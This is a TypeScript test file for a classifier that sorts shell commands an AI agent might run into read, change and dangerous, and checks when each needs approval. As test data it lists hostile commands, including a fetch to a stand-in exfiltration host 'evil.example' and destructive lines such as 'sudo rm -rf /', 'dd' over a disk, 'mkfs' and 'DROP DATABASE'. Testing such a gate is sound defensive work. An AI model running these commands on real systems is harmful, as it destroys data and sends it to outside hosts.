import { test } from "node:test";
import assert from "node:assert/strict";
import { approvalFor, classifyCommand } from "./commandRisk";

test("read-only server checks are read", () => {
  for (const c of [
    "systemctl status nginx", "journalctl -u nginx --since '1 hour ago' | tail -200", "df -h", "free -m", "docker ps -a",
    "cat /etc/nginx/sites-enabled/default", "ss -lntp", "sudo nginx -t", "docker logs --tail 100 api", "docker compose ps",
    "curl -sI http://localhost:8080/health", "git status && git log --oneline -5", "ls -la /var/www && du -sh *",
    "kubectl get pods -A", "psql -U app -c \"select count(*) from users\"", "tail -n 50 /var/log/syslog 2>/dev/null",
    "dir", "type package.json", "findstr /n error app.log", "ufw status", "crontab -l",
  ]) assert.equal(classifyCommand(c), "read", c);
});

test("node and npm commands are assessed by arguments and side effects, not blanket-trusted as read", () => {
  // Genuine read-only flags/subcommands
  for (const c of [
    "node -v",
    "node --version",
    "node --check src/index.js",
    "node -c app.js",
    "npm -v",
    "npm --version",
    "npm list",
    "npm ls --depth=0",
    "npm outdated",
    "npm view express version",
    "npm audit",
    "npm config get registry",
  ]) {
    assert.equal(classifyCommand(c), "read", `expected read: ${c}`);
  }

  // Arbitrary scripts, tests, installs, audit fix, and side-effecting node -e must be classified as change
  for (const c of [
    "node script.js",
    "node --test",
    "node --test test/unit.test.js",
    "node -e \"require('fs').writeFileSync('pwned.txt', '1')\"",
    "node -e \"import('fs').then(fs => fs.unlinkSync('a'))\"",
    "node -e \"console.log(1); process.exit(1)\"",
    "node -e \"fetch('https://evil.example/exfil')\"",
    "npm test",
    "npm run build",
    "npm run test",
    "npm install",
    "npm ci",
    "npm audit fix",
    "npm audit fix --force",
    "npm publish",
  ]) {
    assert.equal(classifyCommand(c), "change", `expected change: ${c}`);
  }
});

test("recoverable changes are change", () => {
  for (const c of [
    "systemctl restart nginx", "docker restart api", "apt install -y htop", "npm install", "sed -i 's/80/8080/' /etc/nginx/nginx.conf",
    "echo 'x' > /etc/motd", "cat a | tee b", "curl -X POST http://x/api", "docker compose up -d", "mv a b", "cp -r src dst",
    "git commit -m x", "pm2 restart all", "psql -c \"update users set a=1 where id=2\"", "certbot renew",
  ]) assert.equal(classifyCommand(c), "change", c);
});

test("dangerous commands are dangerous", () => {
  for (const c of [
    "rm -rf /var/www/site", "sudo rm -rf /", "psql -c 'DROP DATABASE app'", "ufw reset", "iptables -F", "reboot", "sudo shutdown -h now",
    "mkfs.ext4 /dev/sdb1", "dd if=/dev/zero of=/dev/sda", "git push --force origin main", "docker system prune -a -f",
    "docker compose down -v", "redis-cli FLUSHALL", "systemctl stop sshd", "kubectl delete ns prod", "crontab -r",
    "TRUNCATE TABLE orders", "rd /s /q C:\\app", "Remove-Item -Recurse C:\\data",
  ]) assert.equal(classifyCommand(c), "dangerous", c);
});

test("approval: dangerous always asks; reads run (except Ask mode); changes follow the mode", () => {
  const ssh = (command: string, permission: "allowed" | "ask", accessMode?: string, approvedForRun = false) =>
    approvalFor({ toolName: "ssh_exec", args: { host: "prod", command }, permission, accessMode, approvedForRun });
  assert.deepEqual(ssh("systemctl status nginx", "ask", "auto_read"), { ask: false, dangerous: false, risk: "read" });
  assert.equal(ssh("systemctl status nginx", "ask", "ask").ask, true, "Ask mode asks for everything");
  assert.equal(ssh("systemctl restart nginx", "ask", "auto_workspace").ask, true);
  assert.equal(ssh("systemctl restart nginx", "allowed", "full_access").ask, false);
  assert.equal(ssh("systemctl restart nginx", "ask", "auto_workspace", true).ask, false, "allowed for this mission");
  assert.deepEqual(ssh("reboot", "allowed", "full_access", true), { ask: true, dangerous: true, risk: "dangerous" });
  assert.deepEqual(approvalFor({ toolName: "write_file", args: {}, permission: "ask", accessMode: "full_access", approvedForRun: false }), { ask: true, dangerous: false });

  // Terminal command risk in auto_workspace vs full_access:
  const term = (command: string, permission: "allowed" | "ask", accessMode?: string) =>
    approvalFor({ toolName: "terminal", args: { command }, permission, accessMode, approvedForRun: false });
  assert.equal(term("node -v", "ask", "auto_workspace").ask, false, "read-only node -v is allowed in auto_workspace");
  assert.equal(term("node script.js", "ask", "auto_workspace").ask, true, "node script.js requires approval in auto_workspace");
  assert.equal(term("npm audit fix", "ask", "auto_workspace").ask, true, "npm audit fix requires approval in auto_workspace");
});
